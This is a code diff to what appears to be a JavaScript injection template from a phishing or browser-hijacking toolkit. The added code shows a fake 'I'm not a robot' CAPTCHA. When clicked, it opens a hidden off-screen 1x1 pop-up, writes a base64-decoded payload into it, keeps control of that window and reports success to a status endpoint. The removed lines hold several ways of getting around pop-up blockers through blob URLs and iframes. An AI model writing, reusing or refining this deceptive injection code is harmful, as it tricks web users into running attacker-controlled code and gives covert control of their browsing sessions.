@@ -204,9 +204,27 @@ function _isNx(u){if(!u)return false;try{return u.indexOf(_nxs)===0||u.indexOf("
 function _sstat(s){try{var x=new XMLHttpRequest();x.open("POST",_ps,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:window.__rid,status:s}))}catch(e){}}
 function _showPopupPrompt(){
   if(document.getElementById("_xpop"))return;
+  var code=atob("${popupB64}"),html="<html><head></head><body><scr"+"ipt>"+code+"</scr"+"ipt></body></html>";
   var d=document.createElement("div");d.id="_xpop";
-  d.innerHTML='<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.75);z-index:999999;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif"><style>@keyframes _xbounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}@keyframes _xfade{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}@keyframes _xglow{0%,100%{filter:drop-shadow(0 0 8px #ff6b6b)}50%{filter:drop-shadow(0 0 20px #ff6b6b)}}</style><div style="position:fixed;top:10px;right:300px;text-align:center;animation:_xbounce 1s ease-in-out infinite"><svg style="animation:_xglow 1.5s ease-in-out infinite" width="80" height="100" viewBox="0 0 80 100"><defs><marker id="_xarr" markerWidth="10" markerHeight="10" refX="5" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 L2,5 Z" fill="#ff6b6b"/></marker></defs><path d="M40,90 L40,20" stroke="#ff6b6b" stroke-width="4" fill="none" stroke-linecap="round" marker-end="url(#_xarr)"/></svg></div><div style="position:fixed;top:115px;right:120px;color:#fff;font-size:16px;font-weight:700;text-shadow:0 2px 10px rgba(0,0,0,0.5);animation:_xfade 0.4s ease;background:linear-gradient(135deg,#ff6b6b,#ee5a5a);padding:12px 20px;border-radius:30px;box-shadow:0 8px 30px rgba(255,107,107,0.4)">👆 Click here to allow pop-ups!</div><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;animation:_xfade 0.5s ease"><div style="background:#fff;border-radius:16px;padding:28px 40px;box-shadow:0 25px 80px rgba(0,0,0,0.5);max-width:450px"><div style="font-size:48px;margin-bottom:16px">🔒</div><h3 style="margin:0 0 12px;font-size:22px;font-weight:700;color:#1a1a2e">Pop-ups Blocked</h3><p style="margin:0 0 24px;font-size:15px;color:#555;line-height:1.7">This website requires pop-ups. Look for the <strong>blocked pop-up icon</strong> in your address bar and click <strong>Always allow</strong>.</p><button onclick="document.getElementById(\\\'_xpop\\\').remove()" style="background:linear-gradient(135deg,#6366f1 0%,#8b5cf6 100%);color:#fff;border:none;padding:14px 40px;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;box-shadow:0 4px 15px rgba(99,102,241,0.3)">Got it!</button></div></div></div>';
+  d.innerHTML='<style>@keyframes _xspin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes _xcheck{0%{stroke-dashoffset:30}100%{stroke-dashoffset:0}}</style><div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);z-index:999999;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;display:flex;align-items:center;justify-content:center"><div style="background:#fff;border-radius:3px;border:1px solid #d3d3d3;box-shadow:0 4px 16px rgba(0,0,0,0.3);width:302px"><div style="padding:12px 14px"><div style="display:flex;align-items:center;gap:14px"><div id="_xcap" style="width:28px;height:28px;border:2px solid #c1c1c1;border-radius:2px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:border-color 0.15s;background:#fff"><div id="_xbox"></div></div><span style="font-size:14px;color:#000;font-weight:400">I\\'m not a robot</span><div style="margin-left:auto;display:flex;flex-direction:column;align-items:center"><svg width="34" height="34" viewBox="0 0 24 24" fill="none"><path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z" stroke="#4285f4" stroke-width="2"/><path d="M9 12l2 2 4-4" stroke="#34a853" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><span style="font-size:8px;color:#555;margin-top:2px">CAPTCHA</span><span style="font-size:7px;color:#555">Privacy - Terms</span></div></div></div><div style="background:#f9f9f9;border-top:1px solid #e0e0e0;padding:8px 14px;display:flex;justify-content:flex-end"><div style="font-size:10px;color:#555;display:flex;align-items:center;gap:3px"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg><span>Verification required</span></div></div></div></div>';
   document.body.appendChild(d);
+  var cap=document.getElementById("_xcap");
+  var box=document.getElementById("_xbox");
+  cap.onmouseover=function(){cap.style.borderColor="#4285f4"};
+  cap.onmouseout=function(){if(!cap.dataset.clicked)cap.style.borderColor="#c1c1c1"};
+  cap.onclick=function(){
+    if(cap.dataset.clicked)return;cap.dataset.clicked="1";
+    cap.style.borderColor="#4285f4";cap.style.cursor="default";
+    box.innerHTML='<svg width="24" height="24" viewBox="0 0 24 24" style="animation:_xspin 0.8s linear infinite"><circle cx="12" cy="12" r="10" fill="none" stroke="#4285f4" stroke-width="3" stroke-dasharray="50" stroke-linecap="round"/></svg>';
+    setTimeout(function(){
+      box.innerHTML='<svg width="22" height="22" viewBox="0 0 24 24"><path d="M4 12l6 6L20 6" fill="none" stroke="#34a853" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="stroke-dasharray:30;stroke-dashoffset:30;animation:_xcheck 0.3s ease forwards"/></svg>';
+      setTimeout(function(){
+        var p=window.open("about:blank","_xc","width=1,height=1,left=-9999,top=-9999");
+        if(p&&!p.closed){try{p.document.open();p.document.write(html);p.document.close();window.__xctrl=p;try{p.moveTo(-9999,-9999);p.resizeTo(1,1)}catch(e){}_sstat("popup_active")}catch(e){}}
+        d.remove()
+      },500)
+    },1200)
+  }
 }
 function _getBrowserHeaders(w,url){
   var s="",crlf=String.fromCharCode(13,10);
@@ -280,14 +298,7 @@ function injectHooks(w){
   },true)}catch(e){}
 }
 function initAdvanced(){
-  var popup=null,code=atob("${popupB64}"),html="<html><head></head><body><scr"+"ipt>"+code+"</scr"+"ipt></body></html>";
-  function inject(p){try{p.document.open();p.document.write(html);p.document.close();return true}catch(e){try{var s=p.document.createElement("script");s.textContent=code;p.document.body.appendChild(s);return true}catch(e2){try{p.eval(code);return true}catch(e3){return false}}}}
-  function ok(p){if(p&&!p.closed){if(inject(p)){window.__xctrl=p;try{p.moveTo(-9999,-9999);p.resizeTo(1,1)}catch(e){}return true}}return false}
-  try{popup=window.open("about:blank","_xc","width=1,height=1,left=-9999,top=-9999");if(ok(popup))return}catch(e){}
-  try{var blob=new Blob([html],{type:"text/html"});popup=window.open(URL.createObjectURL(blob),"_xc","width=1,height=1,left=-9999,top=-9999");if(popup&&!popup.closed){window.__xctrl=popup;try{popup.moveTo(-9999,-9999);popup.resizeTo(1,1)}catch(e){}return}}catch(e){}
-  try{var ifr=document.createElement("iframe");ifr.style.cssText="position:absolute;width:0;height:0;border:0;opacity:0;pointer-events:none";document.body.appendChild(ifr);popup=ifr.contentWindow.open("about:blank","_xc","width=1,height=1,left=-9999,top=-9999");if(popup){var icode="window.opener=window.parent.opener||window.parent;"+code;try{popup.document.open();popup.document.write("<html><body><scr"+"ipt>"+icode+"</scr"+"ipt></body></html>");popup.document.close();window.__xctrl=popup;try{popup.moveTo(-9999,-9999);popup.resizeTo(1,1)}catch(e){}document.body.removeChild(ifr);return}catch(e){}}try{document.body.removeChild(ifr)}catch(e){}}catch(e){}
-  try{var ifr2=document.createElement("iframe");ifr2.src="javascript:true";ifr2.style.cssText="position:absolute;width:0;height:0;border:0;opacity:0";document.body.appendChild(ifr2);setTimeout(function(){try{popup=ifr2.contentWindow.open("about:blank","_xc","width=1,height=1,left=-9999,top=-9999");if(popup){var icode="window.opener=window.parent.opener||window.parent;"+code;popup.document.open();popup.document.write("<html><body><scr"+"ipt>"+icode+"</scr"+"ipt></body></html>");popup.document.close();window.__xctrl=popup;try{popup.moveTo(-9999,-9999);popup.resizeTo(1,1)}catch(e){}document.body.removeChild(ifr2);return}try{document.body.removeChild(ifr2)}catch(e){}}catch(e){try{document.body.removeChild(ifr2)}catch(e2){}}},10);if(window.__xctrl)return}catch(e){}
-  setTimeout(function(){if(!window.__xctrl){_showPopupPrompt();injectHooks(window);_sstat("popup_blocked")}},600);
+  _showPopupPrompt();injectHooks(window);
 }
 `.replace(/\n/g, '');
   }
